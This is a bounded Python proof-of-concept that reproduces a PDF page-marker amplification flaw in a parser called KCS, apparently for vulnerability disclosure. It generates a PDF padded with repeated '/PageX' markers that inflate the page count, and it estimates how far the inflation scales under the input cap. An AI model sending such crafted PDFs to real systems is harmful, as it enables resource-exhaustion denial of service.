#!/usr/bin/env python3
"""Bounded local probe for KCS PDF page-marker amplification.

The script mirrors the vulnerable parser shape from the reviewed revision:
raw textual /Page prefixes determine page count, one printable content stream
keeps the deterministic PDF path active, and the page vector is padded to the
attacker-selected count. It does not invoke KCS or allocate unbounded units.
"""

from __future__ import annotations

import argparse
import unicodedata


DEFAULT_MAX_INPUT_BYTES = 104_857_600
MARKER = b"/PageX"


def bounded_window(text: str, start: int, max_len: int) -> str:
    return text[start : start + max_len]


def match_indices(text: str, needle: str):
    start = 0
    while True:
        index = text.find(needle, start)
        if index == -1:
            return
        yield index
        start = index + len(needle)


def pdf_page_count_in_text(text: str) -> int:
    type_pages = 0
    for index in match_indices(text, "/Type"):
        tail = bounded_window(text, index, 32)
        if "/Page" in tail and "/Pages" not in tail:
            type_pages += 1

    loose_pages = 0
    for index in match_indices(text, "/Page"):
        tail = bounded_window(text, index, 8)
        if not tail.startswith("/Pages"):
            loose_pages += 1

    return max(type_pages, loose_pages)


def pdf_literal_strings_in_text(text: str) -> list[str]:
    out: list[str] = []
    rest = text
    while True:
        start = rest.find("(")
        if start == -1:
            break
        rest = rest[start + 1 :]
        end = rest.find(")")
        if end == -1:
            break
        candidate = (
            rest[:end]
            .replace("\\(", "(")
            .replace("\\)", ")")
            .replace("\\n", "\n")
        )
        if any(ch.isalnum() or not ch.isascii() for ch in candidate):
            out.append(candidate)
        rest = rest[end + 1 :]
    return out


def pdf_stream_text_pages(data: bytes) -> list[str]:
    text = data.decode("utf-8", errors="replace")
    rest = text
    pages: list[str] = []
    while True:
        stream_start = rest.find("stream")
        if stream_start == -1:
            break
        after_stream = rest[stream_start + len("stream") :]
        for prefix in ("\r\n", "\n", "\r"):
            if after_stream.startswith(prefix):
                after_stream = after_stream[len(prefix) :]
                break
        stream_end = after_stream.find("\nendstream")
        if stream_end == -1:
            break
        stream = after_stream[:stream_end]
        strings = pdf_literal_strings_in_text(stream)
        if strings:
            pages.append("\n".join(strings))
        elif "BT" in stream:
            pages.append("")
        rest = after_stream[stream_end + len("\nendstream") :]
    return pages


def normalize_pdf_page_count(pages: list[str], page_count: int) -> list[str]:
    pages = list(pages)
    while len(pages) < page_count:
        pages.append("")
    return pages[:page_count]


def is_probably_real_text(text: str) -> bool:
    trimmed = text.strip()
    total = len(trimmed)
    if total == 0:
        return False
    printable = sum(
        1
        for ch in trimmed
        if ch != "\ufffd" and (unicodedata.category(ch)[0] != "C" or ch.isspace())
    )
    return printable * 100 >= total * 85


def synthetic_pdf(markers: int) -> bytes:
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n"
        b"<< /Length 31 >>\n"
        b"stream\n"
        b"BT (KCS printable text) Tj ET\n"
        b"endstream\n"
        b"endobj\n"
        + MARKER * markers
        + b"\n%%EOF\n"
    )


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--markers", type=int, default=64)
    parser.add_argument("--max-allocate", type=int, default=256)
    args = parser.parse_args()

    if args.markers < 1:
        raise SystemExit("--markers must be positive")
    if args.max_allocate < 1:
        raise SystemExit("--max-allocate must be positive")

    data = synthetic_pdf(args.markers)
    text = data.decode("utf-8", errors="replace")
    page_count = max(pdf_page_count_in_text(text), 1)
    stream_pages = pdf_stream_text_pages(data)
    padded_pages = normalize_pdf_page_count(stream_pages, page_count)
    deterministic_path_active = not all(not is_probably_real_text(page) for page in padded_pages)
    prepared_unit_count = len(padded_pages) if deterministic_path_active else 0

    zero_marker_size = len(synthetic_pdf(0))
    estimated_markers_under_default_cap = (
        max(DEFAULT_MAX_INPUT_BYTES - zero_marker_size, 0) // len(MARKER)
    )

    materialized = min(prepared_unit_count, args.max_allocate)
    unit_keys = [f"page:{index + 1}" for index in range(materialized)]

    print(f"[+] synthetic_pdf_bytes={len(data)}")
    print(f"[+] marker_bytes={len(MARKER)}")
    print(f"[+] lexical_page_count={page_count}")
    print(f"[+] extracted_stream_pages={len(stream_pages)}")
    print(f"[+] padded_page_vector_len={len(padded_pages)}")
    print(f"[+] deterministic_path_active={str(deterministic_path_active).lower()}")
    print(f"[+] prepared_units={prepared_unit_count}")
    print(f"[+] materialized_in_probe={materialized}")
    print(f"[+] first_unit={unit_keys[0]}")
    print(f"[+] last_materialized_unit={unit_keys[-1]}")
    print(
        "[+] estimated_markers_under_default_100MiB_cap="
        f"{estimated_markers_under_default_cap}"
    )
    if prepared_unit_count > args.max_allocate:
        print("[!] unit materialization capped by --max-allocate for safety")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
